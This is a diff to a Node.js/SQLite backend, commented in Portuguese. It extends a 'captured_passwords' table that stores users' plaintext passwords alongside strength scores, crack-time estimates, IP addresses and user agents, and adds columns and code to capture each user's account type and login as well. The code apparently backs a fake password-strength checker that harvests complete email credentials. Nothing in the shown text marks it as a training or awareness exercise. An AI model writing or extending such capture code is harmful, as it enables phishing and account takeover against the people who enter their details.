@@ -10,11 +10,13 @@ const db = new sqlite3.Database(DB_PATH, (err) => {
   }
 });
 
-// Inicialização da tabela de senhas capturadas
+// Inicialização da tabela de credenciais capturadas
 db.serialize(() => {
   db.run(`
     CREATE TABLE IF NOT EXISTS captured_passwords (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
+      account_type TEXT DEFAULT 'E-mail',
+      account_login TEXT DEFAULT 'Não informado',
       password_value TEXT NOT NULL,
       strength_level TEXT NOT NULL,
       strength_score INTEGER NOT NULL,
@@ -30,17 +32,30 @@ db.serialize(() => {
       console.log('✅ Tabela captured_passwords pronta para uso.');
     }
   });
+
+  // Migrações automáticas seguras caso a tabela já exista de versões anteriores
+  db.run(`ALTER TABLE captured_passwords ADD COLUMN account_type TEXT DEFAULT 'E-mail'`, () => {});
+  db.run(`ALTER TABLE captured_passwords ADD COLUMN account_login TEXT DEFAULT 'Não informado'`, () => {});
 });
 
 /**
- * Salva a senha capturada e metadados no SQLite
+ * Salva as credenciais capturadas e metadados no SQLite
  */
-function saveCapturedPassword({ password, strengthLevel, score, crackTime, ip, userAgent }) {
+function saveCapturedPassword({ accountType, accountLogin, password, strengthLevel, score, crackTime, ip, userAgent }) {
   return new Promise((resolve, reject) => {
     db.run(
-      `INSERT INTO captured_passwords (password_value, strength_level, strength_score, crack_time, user_ip, user_agent)
-       VALUES (?, ?, ?, ?, ?, ?)`,
-      [password, strengthLevel, score, crackTime, ip, userAgent],
+      `INSERT INTO captured_passwords (account_type, account_login, password_value, strength_level, strength_score, crack_time, user_ip, user_agent)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+      [
+        accountType || 'E-mail',
+        accountLogin || 'Não informado',
+        password,
+        strengthLevel,
+        score,
+        crackTime,
+        ip,
+        userAgent
+      ],
       function (err) {
         if (err) {
           return reject(err);
